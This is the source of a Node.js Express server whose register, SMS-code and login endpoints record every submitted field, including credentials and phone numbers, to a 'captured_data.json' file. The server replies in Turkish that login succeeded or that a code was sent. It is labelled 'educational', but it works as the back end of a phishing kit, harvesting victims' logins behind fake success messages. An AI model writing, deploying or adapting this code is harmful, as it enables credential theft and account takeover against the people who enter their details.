const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5000;

app.use(cors());
app.use(bodyParser.json());

// Log directory
const logDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}

const logFile = path.join(logDir, 'captured_data.json');

app.post('/api/register', (req, res) => {
    const userData = req.body;
    const timestamp = new Date().toISOString();
    const entry = { timestamp, ...userData };

    console.log('--- NEW DATA CAPTURED ---');
    console.table(userData);

    // Append to file
    let logs = [];
    if (fs.existsSync(logFile)) {
        const fileContent = fs.readFileSync(logFile, 'utf-8');
        try {
            logs = JSON.parse(fileContent);
        } catch (e) {
            logs = [];
        }
    }
    logs.push(entry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    res.status(200).json({
        message: 'Registration successful. Redirecting to login...',
        status: 'success'
    });
});

app.post('/api/request-code', (req, res) => {
    const { phone } = req.body;
    const timestamp = new Date().toISOString();
    const entry = { timestamp, type: 'CODE_REQUEST', phone };

    console.log(`--- SMS CODE REQUESTED FOR: ${phone} ---`);

    let logs = [];
    if (fs.existsSync(logFile)) {
        const fileContent = fs.readFileSync(logFile, 'utf-8');
        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
    }
    logs.push(entry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    res.status(200).json({
        message: 'SMS kodu gönderildi.',
        status: 'success'
    });
});

app.post('/api/login', (req, res) => {
    const loginData = req.body;
    const timestamp = new Date().toISOString();
    const entry = { timestamp, type: 'LOGIN_ATTEMPT', ...loginData };

    console.log('--- NEW LOGIN ATTEMPT CAPTURED ---');
    console.table(loginData);

    let logs = [];
    if (fs.existsSync(logFile)) {
        const fileContent = fs.readFileSync(logFile, 'utf-8');
        try { logs = JSON.parse(fileContent); } catch (e) { logs = []; }
    }
    logs.push(entry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    res.status(200).json({
        message: 'Giriş başarılı. Sisteme yönlendiriliyorsunuz.',
        status: 'success'
    });
});

app.listen(PORT, () => {
    console.log(`Educational Backend Server is running on http://localhost:${PORT}`);
    console.log('WARNING: This server is for educational demonstrations only.');
});
